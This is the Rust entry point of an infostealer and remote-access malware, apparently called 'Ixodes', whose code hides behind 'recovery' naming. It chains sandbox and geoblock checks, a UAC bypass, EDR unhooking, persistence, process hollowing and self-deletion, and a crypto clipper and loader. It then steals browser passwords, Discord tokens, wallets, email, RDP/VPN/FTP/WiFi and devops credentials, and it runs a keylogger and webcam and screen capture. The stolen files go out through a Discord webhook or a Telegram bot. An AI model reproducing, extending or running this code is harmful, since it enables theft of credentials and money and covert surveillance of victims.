mod build_config;
mod formatter;
mod recovery;
mod sender;

use recovery::task::{RecoveryError, RecoveryOutcome};
use recovery::{RecoveryContext, RecoveryManager};
use tracing_subscriber::prelude::*;
use tracing_subscriber::{EnvFilter, fmt};

#[tokio::main(flavor = "multi_thread")]
async fn main() -> Result<(), RecoveryError> {
    if recovery::killswitch::check_killswitch().await
        || !recovery::behavioral::check_behavioral().await
        || !recovery::geoblock::check_geoblock().await
    {
        std::process::exit(0);
    }

    let fmt_layer = fmt::layer().with_target(false);
    let filter = EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new("info"));
    tracing_subscriber::registry()
        .with(filter)
        .with(fmt_layer)
        .init();

    recovery::uac::attempt_uac_bypass().await;

    recovery::evasion::apply_evasion_techniques();

    let syscall_manager = recovery::helpers::syscalls::SyscallManager::new().ok();
    let _ = recovery::helpers::unhooking::unhook_ntdll(syscall_manager.as_ref());

    let context = RecoveryContext::discover()
        .map_err(|err| RecoveryError::Custom(format!("context initialization failed: {err}")))?;

    recovery::persistence::install_persistence().await;

    if recovery::hollowing::perform_hollowing().await {
        recovery::self_delete::perform_melt();
        std::process::exit(0);
    }

    recovery::clipper::run_clipper().await;
    recovery::loader::run_loader().await;

    let mut manager = RecoveryManager::new(context.clone());
    register_all_tasks(&mut manager, &context).await?;

    let outcomes = manager.run_all().await?;

    tracing::info!("recovery session complete: {} tasks", outcomes.len());

    if let Err(err) = send_outcomes(&outcomes).await {
        tracing::error!(error = %err, "failed to send recovery artifacts");
    }

    Ok(())
}

async fn register_all_tasks(
    manager: &mut RecoveryManager,
    context: &RecoveryContext,
) -> Result<(), RecoveryError> {
    use recovery::{
        account_validation, behavioral, browsers, chromium, clipboard, devops, discord, email,
        file_recovery, ftp, gaming, gecko, gecko_passwords, hardware, messenger, other, proxy, rdp,
        screenshot, services, surveillance, system, vnc, vpn, wallet, webcam, wifi,
    };

    manager.register_tasks(browsers::default_browser_tasks(context).await);
    manager.register_tasks(gecko::gecko_tasks(context));
    manager.register_tasks(gecko_passwords::gecko_password_tasks(context));
    manager.register_tasks(chromium::chromium_secrets_tasks(context));

    manager.register_task(std::sync::Arc::new(proxy::ReverseProxyTask));
    manager.register_task(std::sync::Arc::new(surveillance::keylogger::KeyloggerTask));

    manager.register_tasks(gaming::gaming_service_tasks(context));
    manager.register_tasks(gaming::gaming_extra_tasks(context));

    manager.register_tasks(messenger::messenger_tasks(context));
    manager.register_tasks(discord::discord_token_task(context));
    manager.register_task(discord::discord_profile_task(context));
    manager.register_task(discord::discord_service_task(context));
    manager.register_tasks(services::email_tasks(context));
    manager.register_task(email::outlook_registry_task());

    manager.register_tasks(wallet::wallet_tasks(context));

    manager.register_tasks(system::system_tasks(context));
    manager.register_tasks(hardware::hardware_tasks(context));
    manager.register_task(account_validation::account_validation_task(context));

    manager.register_tasks(rdp::rdp_tasks(context));
    manager.register_tasks(vnc::vnc_tasks(context));
    manager.register_tasks(vpn::vpn_tasks(context));
    manager.register_tasks(ftp::ftp_tasks(context));
    manager.register_task(wifi::wifi_task(context));

    let control = recovery::settings::RecoveryControl::global();
    if control.capture_screenshots() {
        manager.register_task(screenshot::screenshot_task(context));
    }
    if control.capture_webcams() {
        manager.register_task(webcam::webcam_task(context));
    }
    if control.capture_clipboard() {
        manager.register_task(clipboard::clipboard_task(context));
    }

    manager.register_tasks(behavioral::behavioral_tasks(context));
    manager.register_task(file_recovery::file_recovery_task(context));
    manager.register_tasks(other::other_tasks(context));
    manager.register_tasks(devops::devops_tasks(context));
    manager.register_tasks(devops::devops_extra_tasks(context));

    Ok(())
}

async fn send_outcomes(outcomes: &[RecoveryOutcome]) -> Result<(), Box<dyn std::error::Error>> {
    use formatter::MessageFormatter;
    use recovery::settings::RecoveryControl;
    use sender::{ChatId, DiscordSender, Sender, TelegramSender};
    use tokio::fs;

    let control = RecoveryControl::global();

    let sender = if let Some(webhook) = control.discord_webhook() {
        Sender::Discord(DiscordSender::new(webhook.to_string()))
    } else if let Some(token) = control.telegram_token() {
        let chat_id = control
            .telegram_chat_id()
            .map(ChatId::from)
            .unwrap_or_else(|| ChatId::from(0));
        Sender::Telegram(TelegramSender::new(token.to_string()), chat_id)
    } else {
        tracing::warn!(
            "no sender configuration found (IXODES_DISCORD_WEBHOOK or IXODES_TELEGRAM_TOKEN)"
        );
        return Ok(());
    };

    let mut summary = String::new();
    summary.push_str("Recovery Session Complete\n\n");
    for outcome in outcomes {
        use std::fmt::Write;
        let _ = writeln!(
            &mut summary,
            "Task: {} | Status: {:?} | Artifacts: {}",
            outcome.task,
            outcome.status,
            outcome.artifacts.len()
        );
    }

    let formatter = MessageFormatter::new().with_max_length(sender.max_message_length());
    // Send summary first, without attachments
    sender
        .send_formatted_message(&formatter, vec![summary], None)
        .await?;

    // Batch and stream artifacts
    const BATCH_SIZE_LIMIT: usize = 4 * 1024 * 1024; // 4MB
    const MAX_ARTIFACT_SIZE: u64 = 50 * 1024 * 1024; // 50MB

    let mut current_batch: Vec<(String, Vec<u8>)> = Vec::new();
    let mut current_batch_size = 0;

    for outcome in outcomes {
        for artifact in &outcome.artifacts {
            // Skip oversized files to prevent OOM or timeouts
            if artifact.size_bytes > MAX_ARTIFACT_SIZE {
                tracing::warn!(
                    "skipping large artifact: {} ({} bytes)",
                    artifact.path.display(),
                    artifact.size_bytes
                );
                continue;
            }

            // Check if adding this file would exceed the batch limit
            // Note: we cast size_bytes to usize, assuming we are on 64-bit where usize is large enough
            let size = artifact.size_bytes as usize;
            
            if current_batch_size + size > BATCH_SIZE_LIMIT && !current_batch.is_empty() {
                if let Err(e) = sender.send_files(&current_batch).await {
                    tracing::error!("failed to send artifact batch: {}", e);
                }
                current_batch.clear();
                current_batch_size = 0;
            }

            match fs::read(&artifact.path).await {
                Ok(content) => {
                    let filename = artifact
                        .path
                        .file_name()
                        .and_then(|n| n.to_str())
                        .unwrap_or("unknown")
                        .to_string();
                    
                    current_batch_size += content.len();
                    current_batch.push((filename, content));
                }
                Err(e) => {
                    tracing::warn!("failed to read artifact {}: {}", artifact.path.display(), e);
                }
            }
        }
    }

    // Send any remaining artifacts
    if !current_batch.is_empty() {
        if let Err(e) = sender.send_files(&current_batch).await {
            tracing::error!("failed to send final artifact batch: {}", e);
        }
    }

    Ok(())
}
